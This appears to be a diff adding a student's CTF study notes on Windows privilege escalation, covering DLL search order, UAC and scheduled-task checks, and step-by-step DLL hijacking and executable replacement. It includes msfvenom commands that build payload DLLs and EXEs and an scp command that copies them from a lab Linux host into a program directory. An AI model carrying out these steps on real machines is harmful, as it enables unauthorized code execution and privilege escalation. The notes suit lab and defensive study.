@@ -1,0 +1,77 @@
+Windows: 
+
+DLL Search Order (IMPORTANT for CTF):
+	
+	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+	
+	The directory the the Application was run from
+	
+	The directory specified in in the C+ function GetSystemDirectory()
+	
+	The directory specified in the C+ function GetWindowsDirectory()
+	
+	The current directory
+
+Checking UAC Settings:
+	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+command to check:
+	net use z: "\\http://live.sysinternals.com" /persistent:yes
+
+Scheduled Tasks and Services:
+
+	schtasks /query /fo LIST /v
+
+	Write Permissions
+
+    Non-Standard Locations
+
+    Unquoted Executable Paths
+
+    Vulnerabilities in Executables
+
+    Permissions to Run As SYSTEM
+
+DLL Hijacking:
+	
+	(1) open services find one that is vulnerable 
+	(2) test if you can right to the directory by creating a text file (if you can only rename the .exe, go to lower steps)
+	(3) to find the dlls the .exe calls on open procmon.exe in the mapped drive
+	might have to swap with 5 (4) add the filters Process Name contains <name of .exe>, Path contains .dll, Result is NAME NOT FOUND
+	(5) Reboot the machine 
+	(6) Pick any of the .dlls
+	(7) on the linux machine run msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\<username>\Desktop\whoami.txt' -f dll > SSPICLI.dll
+	(8) from windows scp the dll over from the linux EX: scp student@10.50.33.204:/home/student/SSPICLI.dll "C:\Program Files (x86)\Putty\SSPICLI.dll" 
+	(9) run the program
+
+EXE Replacment:
+	
+	(1) Rename the executable 
+	(2) msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f exe > putty.exe
+	(3) scp the file into the same file as the application
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
